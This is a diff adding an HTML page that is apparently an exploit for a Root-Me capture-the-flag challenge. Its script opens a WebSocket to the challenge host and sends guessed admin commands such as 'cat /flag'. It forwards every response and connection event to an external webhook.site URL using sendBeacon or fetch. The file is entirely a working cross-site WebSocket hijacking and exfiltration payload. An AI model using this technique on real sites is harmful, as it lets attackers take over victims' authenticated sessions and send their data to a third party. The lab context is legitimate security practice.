@@ -1,0 +1,66 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Exploit WS - Root-Me</title>
+<body>
+<script>
+(function(){
+  const WS_URL = "ws://ctf03.root-me.org/ws";
+  const EXFIL_URL = "https://webhook.site/bbc1f1ee-2d9e-4a8e-a29e-8bb7885bb805";
+
+  function exfil(data){
+    try{
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(EXFIL_URL + "?d=" + encodeURIComponent(data));
+      } else {
+        fetch(EXFIL_URL + "?d=" + encodeURIComponent(data)).catch(()=>{});
+      }
+    } catch(e){}
+  }
+
+  const tries_json = [
+    {user:"admin", command:"getflag"},
+    {role:"admin", action:"flag"},
+    {auth:"admin", cmd:"cat /flag"},
+    {admin:true, command:"getflag"}
+  ];
+
+  let ws;
+  try {
+    ws = new WebSocket(WS_URL);
+  } catch(err) {
+    exfil("WS_OPEN_ERROR:" + String(err));
+    return;
+  }
+
+  ws.onopen = function(){
+    exfil("WS_OPENED:" + WS_URL);
+    for (let j=0;j<tries_json.length;j++){
+      (function(obj, delay){
+        setTimeout(()=>{ 
+          try{ 
+            const s = JSON.stringify(obj);
+            ws.send(s); 
+            exfil("SENT_JSON:"+s);
+          } catch(e){ exfil("SEND_JSON_FAIL:"+JSON.stringify(obj)); }
+        }, 1000*j);
+      })(tries_json[j], 1000*j);
+    }
+  };
+
+  ws.onmessage = function(ev){
+    try{ 
+      exfil("RECV:" + String(ev.data));
+    } catch(e){ exfil("ONMESSAGE_ERROR"); }
+  };
+
+  ws.onerror = function(ev){
+    exfil("WS_ERROR");
+  };
+  ws.onclose = function(ev){
+    exfil("WS_CLOSED");
+  };
+
+  setTimeout(()=>{ try{ ws.close(); }catch(e){}; exfil("TIMEOUT_CLOSED"); }, 10000);
+})();
+</script>
+</body>
